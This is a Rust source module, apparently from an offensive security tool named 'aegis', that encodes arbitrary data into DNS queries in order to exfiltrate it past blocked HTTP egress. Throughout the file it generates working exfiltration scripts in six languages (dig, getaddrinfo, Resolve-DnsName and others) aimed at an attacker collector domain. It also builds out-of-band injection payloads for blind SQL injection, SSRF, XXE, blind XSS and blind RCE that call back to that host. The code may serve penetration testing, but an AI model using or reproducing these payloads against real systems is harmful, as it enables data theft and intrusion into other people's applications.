/// DNS-based data exfiltration payload generator.
///
/// Encodes arbitrary data as DNS query labels for exfiltration when HTTP egress
/// is blocked. Handles chunking, compression, multi-language payload generation,
/// and OOB (out-of-band) callback payloads for blind vulnerability confirmation.
use std::fmt;
use std::io::{Read, Write};

use flate2::read::GzDecoder;
use flate2::write::GzEncoder;
use flate2::Compression;

/// Maximum length of a single DNS label (RFC 1035).
const MAX_LABEL_LEN: usize = 63;

/// Maximum total length of a DNS name including dots (RFC 1035).
const MAX_DNS_NAME_LEN: usize = 253;

/// Overhead per chunk: sequence prefix like `s00-` plus the collector domain
/// suffix (dot + domain). We reserve a generous amount so payloads stay legal.
const SEQUENCE_PREFIX_LEN: usize = 4; // e.g. "s00-" or "sff-"

/// Encoding schemes for turning raw bytes into DNS-safe label characters.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsEncoding {
    /// Lowercase hex — 2 chars per byte, only `[0-9a-f]`.
    Hex,
    /// Base32 (RFC 4648, no padding) — ~1.6 chars per byte, `[a-z2-7]`.
    Base32,
}

impl fmt::Display for DnsEncoding {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DnsEncoding::Hex => write!(f, "hex"),
            DnsEncoding::Base32 => write!(f, "base32"),
        }
    }
}

/// Target scripting language for generated exfil payloads.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadLanguage {
    Bash,
    Python,
    Php,
    Ruby,
    Perl,
    Powershell,
}

impl fmt::Display for PayloadLanguage {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            PayloadLanguage::Bash => write!(f, "bash"),
            PayloadLanguage::Python => write!(f, "python"),
            PayloadLanguage::Php => write!(f, "php"),
            PayloadLanguage::Ruby => write!(f, "ruby"),
            PayloadLanguage::Perl => write!(f, "perl"),
            PayloadLanguage::Powershell => write!(f, "powershell"),
        }
    }
}

/// Category of blind vulnerability being confirmed via OOB DNS callback.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OobVulnType {
    BlindSqli,
    Ssrf,
    Xxe,
    BlindXss,
    BlindRce,
}

impl fmt::Display for OobVulnType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            OobVulnType::BlindSqli => write!(f, "blind-sqli"),
            OobVulnType::Ssrf => write!(f, "ssrf"),
            OobVulnType::Xxe => write!(f, "xxe"),
            OobVulnType::BlindXss => write!(f, "blind-xss"),
            OobVulnType::BlindRce => write!(f, "blind-rce"),
        }
    }
}

/// A single DNS query chunk ready for transmission.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DnsChunk {
    /// Sequence index (0-based).
    pub sequence: u16,
    /// The encoded data portion (DNS-safe characters).
    pub encoded_data: String,
    /// Full DNS query name: `{seq_prefix}{encoded}.{collector}`.
    pub query_name: String,
}

/// Result of encoding data into DNS exfiltration queries.
#[derive(Debug, Clone)]
pub struct DnsExfilPayload {
    /// Individual DNS query chunks in transmission order.
    pub chunks: Vec<DnsChunk>,
    /// CRC32 checksum of the original (pre-compression) data.
    pub crc32: u32,
    /// Final "checksum" query that the receiver uses for integrity verification.
    pub checksum_query: String,
    /// Total number of queries the receiver should expect (chunks + checksum).
    pub total_queries: usize,
    /// Encoding used.
    pub encoding: DnsEncoding,
    /// Whether gzip compression was applied before encoding.
    pub compressed: bool,
}

/// OOB callback payload for blind vulnerability confirmation.
#[derive(Debug, Clone)]
pub struct OobPayload {
    /// The vulnerability type this payload confirms.
    pub vuln_type: OobVulnType,
    /// Unique callback token embedded in the DNS query.
    pub callback_token: String,
    /// The DNS query name the receiver should watch for.
    pub expected_query: String,
    /// Injection payload for the target application.
    pub injection_payload: String,
}

/// Configuration for the DNS exfiltration encoder.
#[derive(Debug, Clone)]
pub struct DnsExfilConfig {
    /// Collector domain that receives the DNS queries, e.g. `"c.attacker.com"`.
    pub collector_domain: String,
    /// Encoding scheme.
    pub encoding: DnsEncoding,
    /// Apply gzip compression before encoding.
    pub compress: bool,
}

impl DnsExfilConfig {
    pub fn new(collector_domain: &str, encoding: DnsEncoding, compress: bool) -> Self {
        Self {
            collector_domain: collector_domain.to_string(),
            encoding,
            compress,
        }
    }

    /// Maximum bytes of encoded data that fit in one DNS label after reserving
    /// space for the sequence prefix.
    fn usable_label_len(&self) -> usize {
        MAX_LABEL_LEN - SEQUENCE_PREFIX_LEN
    }

    /// Maximum number of labels we can pack into a single DNS name, given the
    /// collector domain suffix and dots.
    fn max_labels_per_query(&self) -> usize {
        // Full name: label1.label2...labelN.collector_domain
        // Each label adds label_len + 1 (dot separator).
        // Collector adds collector_domain.len() + 1 (leading dot).
        let suffix_len = self.collector_domain.len() + 1; // ".collector"
        let available = MAX_DNS_NAME_LEN.saturating_sub(suffix_len);
        let per_label = MAX_LABEL_LEN + 1; // label + dot
        let labels = available / per_label;
        labels.max(1)
    }

    /// Bytes of raw encoded data per DNS query (across all labels).
    fn encoded_bytes_per_query(&self) -> usize {
        self.usable_label_len() * self.max_labels_per_query()
    }
}

// ---------------------------------------------------------------------------
// Encoding helpers
// ---------------------------------------------------------------------------

fn encode_bytes(data: &[u8], encoding: DnsEncoding) -> String {
    match encoding {
        DnsEncoding::Hex => hex_encode(data),
        DnsEncoding::Base32 => base32_encode(data),
    }
}

fn decode_bytes(encoded: &str, encoding: DnsEncoding) -> Result<Vec<u8>, DnsExfilError> {
    match encoding {
        DnsEncoding::Hex => hex_decode(encoded),
        DnsEncoding::Base32 => base32_decode(encoded),
    }
}

fn hex_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len() * 2);
    for byte in data {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

fn hex_decode(s: &str) -> Result<Vec<u8>, DnsExfilError> {
    if !s.len().is_multiple_of(2) {
        return Err(DnsExfilError::DecodeError(
            "hex string has odd length".into(),
        ));
    }
    let mut out = Vec::with_capacity(s.len() / 2);
    let bytes = s.as_bytes();
    for i in (0..bytes.len()).step_by(2) {
        let hi = hex_nibble(bytes[i])?;
        let lo = hex_nibble(bytes[i + 1])?;
        out.push((hi << 4) | lo);
    }
    Ok(out)
}

fn hex_nibble(b: u8) -> Result<u8, DnsExfilError> {
    match b {
        b'0'..=b'9' => Ok(b - b'0'),
        b'a'..=b'f' => Ok(b - b'a' + 10),
        b'A'..=b'F' => Ok(b - b'A' + 10),
        _ => Err(DnsExfilError::DecodeError(format!("invalid hex char: {b}"))),
    }
}

/// RFC 4648 base32 encode (lowercase, no padding).
fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";
    let mut out = String::new();
    let mut buffer: u64 = 0;
    let mut bits: u32 = 0;
    for &byte in data {
        buffer = (buffer << 8) | u64::from(byte);
        bits += 8;
        while bits >= 5 {
            bits -= 5;
            let idx = ((buffer >> bits) & 0x1f) as usize;
            out.push(ALPHABET[idx] as char);
        }
    }
    if bits > 0 {
        let idx = ((buffer << (5 - bits)) & 0x1f) as usize;
        out.push(ALPHABET[idx] as char);
    }
    out
}

/// RFC 4648 base32 decode (lowercase, no padding).
fn base32_decode(s: &str) -> Result<Vec<u8>, DnsExfilError> {
    let mut buffer: u64 = 0;
    let mut bits: u32 = 0;
    let mut out = Vec::new();
    for ch in s.chars() {
        let val = match ch {
            'a'..='z' => (ch as u8) - b'a',
            'A'..='Z' => (ch as u8) - b'A',
            '2'..='7' => (ch as u8) - b'2' + 26,
            _ => {
                return Err(DnsExfilError::DecodeError(format!(
                    "invalid base32 char: {ch}"
                )))
            }
        };
        buffer = (buffer << 5) | u64::from(val);
        bits += 5;
        if bits >= 8 {
            bits -= 8;
            out.push((buffer >> bits) as u8);
        }
    }
    Ok(out)
}

// ---------------------------------------------------------------------------
// Compression helpers
// ---------------------------------------------------------------------------

fn gzip_compress(data: &[u8]) -> Result<Vec<u8>, DnsExfilError> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
    encoder
        .write_all(data)
        .map_err(|e| DnsExfilError::CompressionError(e.to_string()))?;
    encoder
        .finish()
        .map_err(|e| DnsExfilError::CompressionError(e.to_string()))
}

fn gzip_decompress(data: &[u8]) -> Result<Vec<u8>, DnsExfilError> {
    let mut decoder = GzDecoder::new(data);
    let mut out = Vec::new();
    decoder
        .read_to_end(&mut out)
        .map_err(|e| DnsExfilError::CompressionError(e.to_string()))?;
    Ok(out)
}

// ---------------------------------------------------------------------------
// CRC32
// ---------------------------------------------------------------------------

fn crc32_checksum(data: &[u8]) -> u32 {
    crc32fast::hash(data)
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DnsExfilError {
    DecodeError(String),
    CompressionError(String),
    LabelTooLong(usize),
    DataTooLarge(String),
    InvalidChecksum { expected: u32, actual: u32 },
}

impl fmt::Display for DnsExfilError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            DnsExfilError::DecodeError(msg) => write!(f, "decode error: {msg}"),
            DnsExfilError::CompressionError(msg) => write!(f, "compression error: {msg}"),
            DnsExfilError::LabelTooLong(len) => {
                write!(f, "label length {len} exceeds max {MAX_LABEL_LEN}")
            }
            DnsExfilError::DataTooLarge(msg) => write!(f, "data too large: {msg}"),
            DnsExfilError::InvalidChecksum { expected, actual } => {
                write!(
                    f,
                    "CRC32 mismatch: expected {expected:#010x}, got {actual:#010x}"
                )
            }
        }
    }
}

impl std::error::Error for DnsExfilError {}

// ---------------------------------------------------------------------------
// Core encoding pipeline
// ---------------------------------------------------------------------------

/// Encode arbitrary data into a set of DNS exfiltration queries.
pub fn encode_exfil(
    data: &[u8],
    config: &DnsExfilConfig,
) -> Result<DnsExfilPayload, DnsExfilError> {
    let crc = crc32_checksum(data);

    let wire_data = if config.compress {
        gzip_compress(data)?
    } else {
        data.to_vec()
    };

    let encoded_all = encode_bytes(&wire_data, config.encoding);

    let bytes_per_query = config.encoded_bytes_per_query();
    let raw_chunks: Vec<&str> = if encoded_all.is_empty() {
        vec![""]
    } else {
        encoded_all
            .as_bytes()
            .chunks(bytes_per_query)
            .map(|c| std::str::from_utf8(c).expect("encoding produced valid utf8"))
            .collect()
    };

    let usable = config.usable_label_len();
    let mut chunks = Vec::with_capacity(raw_chunks.len());

    for (seq, chunk_data) in raw_chunks.iter().enumerate() {
        let seq_prefix = format!("s{seq:02x}-");
        let labels: Vec<String> = if chunk_data.is_empty() {
            vec![format!("{seq_prefix}empty")]
        } else {
            chunk_data
                .as_bytes()
                .chunks(usable)
                .map(|part| {
                    let label_body = std::str::from_utf8(part).expect("valid utf8");
                    format!("{seq_prefix}{label_body}")
                })
                .collect()
        };

        let query_name = format!("{}.{}", labels.join("."), config.collector_domain);

        if query_name.len() > MAX_DNS_NAME_LEN {
            // Re-split with fewer labels to respect total length.
            // Fall back to one label per query for safety.
            let single_label = format!("{seq_prefix}{}", truncate_to(chunk_data, usable));
            let query_name_short = format!("{single_label}.{}", config.collector_domain);
            chunks.push(DnsChunk {
                sequence: seq as u16,
                encoded_data: truncate_to(chunk_data, usable).to_string(),
                query_name: query_name_short,
            });
        } else {
            chunks.push(DnsChunk {
                sequence: seq as u16,
                encoded_data: chunk_data.to_string(),
                query_name,
            });
        }
    }

    let checksum_query = format!(
        "crc-{crc:08x}.cnt-{:04x}.{}",
        chunks.len(),
        config.collector_domain
    );

    let total_queries = chunks.len() + 1; // data chunks + checksum

    Ok(DnsExfilPayload {
        chunks,
        crc32: crc,
        checksum_query,
        total_queries,
        encoding: config.encoding,
        compressed: config.compress,
    })
}

fn truncate_to(s: &str, max: usize) -> &str {
    if s.len() <= max {
        s
    } else {
        &s[..max]
    }
}

/// Decode DNS exfiltration chunks back to the original data.
///
/// Chunks must be provided in sequence order. Validates CRC32 against
/// `expected_crc`.
pub fn decode_exfil(
    chunks: &[DnsChunk],
    encoding: DnsEncoding,
    compressed: bool,
    expected_crc: u32,
) -> Result<Vec<u8>, DnsExfilError> {
    let mut sorted: Vec<&DnsChunk> = chunks.iter().collect();
    sorted.sort_by_key(|c| c.sequence);

    let combined_encoded: String = sorted.iter().map(|c| c.encoded_data.as_str()).collect();

    if combined_encoded == "empty" || combined_encoded.is_empty() {
        // Empty payload edge case
        let crc = crc32_checksum(&[]);
        if crc != expected_crc {
            return Err(DnsExfilError::InvalidChecksum {
                expected: expected_crc,
                actual: crc,
            });
        }
        return Ok(Vec::new());
    }

    let wire_data = decode_bytes(&combined_encoded, encoding)?;

    let original = if compressed {
        gzip_decompress(&wire_data)?
    } else {
        wire_data
    };

    let actual_crc = crc32_checksum(&original);
    if actual_crc != expected_crc {
        return Err(DnsExfilError::InvalidChecksum {
            expected: expected_crc,
            actual: actual_crc,
        });
    }

    Ok(original)
}

// ---------------------------------------------------------------------------
// Payload generation per language
// ---------------------------------------------------------------------------

/// Generate a complete exfiltration script in the given language.
pub fn generate_exfil_script(payload: &DnsExfilPayload, language: PayloadLanguage) -> String {
    match language {
        PayloadLanguage::Bash => gen_bash_script(payload),
        PayloadLanguage::Python => gen_python_script(payload),
        PayloadLanguage::Php => gen_php_script(payload),
        PayloadLanguage::Ruby => gen_ruby_script(payload),
        PayloadLanguage::Perl => gen_perl_script(payload),
        PayloadLanguage::Powershell => gen_powershell_script(payload),
    }
}

fn gen_bash_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("#!/bin/bash".to_string());
    lines.push("# DNS exfiltration — generated by aegis".to_string());
    for chunk in &p.chunks {
        lines.push(format!("dig +short {} @8.8.8.8", chunk.query_name));
    }
    lines.push(format!("dig +short {} @8.8.8.8", p.checksum_query));
    lines.join("\n")
}

fn gen_python_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("import socket".to_string());
    lines.push("# DNS exfiltration — generated by aegis".to_string());
    lines.push("queries = [".to_string());
    for chunk in &p.chunks {
        lines.push(format!("    \"{}\",", chunk.query_name));
    }
    lines.push(format!("    \"{}\",", p.checksum_query));
    lines.push("]".to_string());
    lines.push("for q in queries:".to_string());
    lines.push("    socket.getaddrinfo(q, None)".to_string());
    lines.join("\n")
}

fn gen_php_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("<?php".to_string());
    lines.push("// DNS exfiltration — generated by aegis".to_string());
    for chunk in &p.chunks {
        lines.push(format!("gethostbyname('{}');", chunk.query_name));
    }
    lines.push(format!("gethostbyname('{}');", p.checksum_query));
    lines.push("?>".to_string());
    lines.join("\n")
}

fn gen_ruby_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("require 'resolv'".to_string());
    lines.push("# DNS exfiltration — generated by aegis".to_string());
    for chunk in &p.chunks {
        lines.push(format!("Resolv.getaddress('{}')", chunk.query_name));
    }
    lines.push(format!("Resolv.getaddress('{}')", p.checksum_query));
    lines.join("\n")
}

fn gen_perl_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("use Socket;".to_string());
    lines.push("# DNS exfiltration — generated by aegis".to_string());
    for chunk in &p.chunks {
        lines.push(format!("inet_aton(gethostbyname('{}'));", chunk.query_name));
    }
    lines.push(format!("inet_aton(gethostbyname('{}'));", p.checksum_query));
    lines.join("\n")
}

fn gen_powershell_script(p: &DnsExfilPayload) -> String {
    let mut lines = Vec::new();
    lines.push("# DNS exfiltration — generated by aegis".to_string());
    for chunk in &p.chunks {
        lines.push(format!("Resolve-DnsName -Name '{}'", chunk.query_name));
    }
    lines.push(format!("Resolve-DnsName -Name '{}'", p.checksum_query));
    lines.join("\n")
}

// ---------------------------------------------------------------------------
// OOB callback payloads
// ---------------------------------------------------------------------------

/// Generate an OOB DNS callback payload for confirming a blind vulnerability.
pub fn generate_oob_payload(
    vuln_type: OobVulnType,
    callback_token: &str,
    collector_domain: &str,
) -> OobPayload {
    let expected_query = format!("{callback_token}.{collector_domain}");

    let injection_payload = match vuln_type {
        OobVulnType::BlindSqli => {
            format!(
                "' AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{callback_token}.{collector_domain}','\\\\a')))a)-- -"
            )
        }
        OobVulnType::Ssrf => {
            format!("http://{callback_token}.{collector_domain}/ssrf")
        }
        OobVulnType::Xxe => {
            format!(
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{callback_token}.{collector_domain}/xxe\">]><root>&xxe;</root>"
            )
        }
        OobVulnType::BlindXss => {
            format!(
                "<script>new Image().src='http://{callback_token}.{collector_domain}/xss'</script>"
            )
        }
        OobVulnType::BlindRce => {
            format!("curl {callback_token}.{collector_domain}")
        }
    };

    OobPayload {
        vuln_type,
        callback_token: callback_token.to_string(),
        expected_query,
        injection_payload,
    }
}

// ---------------------------------------------------------------------------
// Validation helpers
// ---------------------------------------------------------------------------

/// Validate that all chunks in a payload respect DNS label and name limits.
pub fn validate_payload(payload: &DnsExfilPayload) -> Vec<DnsExfilError> {
    let mut errors = Vec::new();
    for chunk in &payload.chunks {
        if chunk.query_name.len() > MAX_DNS_NAME_LEN {
            errors.push(DnsExfilError::LabelTooLong(chunk.query_name.len()));
        }
        for label in chunk.query_name.split('.') {
            if label.len() > MAX_LABEL_LEN {
                errors.push(DnsExfilError::LabelTooLong(label.len()));
            }
        }
    }
    errors
}
